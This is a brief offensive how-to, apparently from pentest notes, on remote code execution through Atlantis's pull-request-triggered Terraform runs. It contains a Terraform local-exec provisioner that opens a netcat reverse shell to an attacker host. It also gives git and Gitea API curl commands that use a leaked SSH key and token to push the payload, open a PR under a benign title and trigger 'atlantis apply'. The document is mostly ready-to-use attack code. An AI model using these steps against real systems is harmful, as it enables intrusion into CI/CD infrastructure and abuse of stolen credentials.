# Atlantis Terraform PR-Triggered RCE

Atlantis runs `terraform plan`/`apply` automatically on pull requests against an allow-listed repo — if you can push a branch and open a PR against that repo (via a leaked git credential/SSH key), a `local-exec` provisioner in your Terraform diff is just a command execution primitive once a comment triggers apply:

```hcl
resource "null_resource" "pwn" {
  provisioner "local-exec" {
    command = "busybox nc <LHOST> <LPORT> -e bash"
  }
}
```
```bash
git checkout -b pwn && git add pwn.tf && git commit -m 'add terraform resource'
GIT_SSH_COMMAND="ssh -i <key> -o IdentitiesOnly=yes" git push --set-upstream origin pwn
curl -X POST -k 'https://<gitea-host>/api/v1/repos/<org>/<repo>/pulls' -H 'Authorization: token <TOKEN>' \
  -H 'Content-Type: application/json' -d '{"base":"main","head":"pwn","title":"infra change"}'
curl -X POST -k 'https://<gitea-host>/api/v1/repos/<org>/<repo>/issues/<pr-number>/comments' -H 'Authorization: token <TOKEN>' \
  -H 'Content-Type: application/json' -d '{"body":"atlantis apply"}'
```
A read-only/clone-only token can still get you here if a separately-leaked SSH key has push rights — the API token only needs to create the PR and post the trigger comment.
